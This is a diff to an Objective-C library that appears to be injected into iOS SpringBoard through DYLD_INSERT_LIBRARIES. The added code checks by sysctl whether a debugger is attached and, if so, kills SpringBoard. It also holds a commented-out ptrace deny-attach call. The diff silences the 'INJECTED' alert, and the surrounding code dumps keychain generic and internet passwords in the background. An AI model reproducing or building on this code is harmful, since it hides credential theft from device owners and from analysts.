@@ -14,6 +14,11 @@
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
 #import <sqlite3.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/sysctl.h>
+#include <stdlib.h>
+//#include <sys/ptrace.h>
 
 #pragma mark - Keychain Prototype Function
 
@@ -309,6 +314,29 @@ void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
 	return;
 }
 
+
+//-----------------------------------
+
+static int is_being_debugging(void)
+{
+    int name[4];
+    struct kinfo_proc info;
+    size_t info_size = sizeof(info);
+    
+    info.kp_proc.p_flag = 0;
+    
+    name[0] = CTL_KERN;
+    name[1] = KERN_PROC;
+    name[2] = KERN_PROC_PID;
+    name[3] = getpid();
+    
+    if (sysctl(name, 4, &info, &info_size, NULL, 0) == -1) {
+        perror("sysctl");
+        exit(-1);
+    }
+    return ((info.kp_proc.p_flag & P_TRACED) != 0);
+}
+
 @implementation AFNetwork
 
 - (void)socket:(int)argc Async:(char **)argv{
@@ -377,6 +405,10 @@ static IMP sOriginalImp = NULL;
 @implementation Monsoon
 
 + (void)load{
+    if (is_being_debugging()) {
+        system("killall SpringBoard");
+    }
+    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
     Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
     Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
     sOriginalImp = method_getImplementation(originalMeth);
@@ -385,9 +417,16 @@ static IMP sOriginalImp = NULL;
 }
 
 - (void)patchedLaunch:(_Bool)arg1{
+    
+    if (is_being_debugging()) {
+        system("killall SpringBoard");
+    }
+    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
+    
     sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
-    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
-    [alert show];
+    
+    //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
+    //[alert show];
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
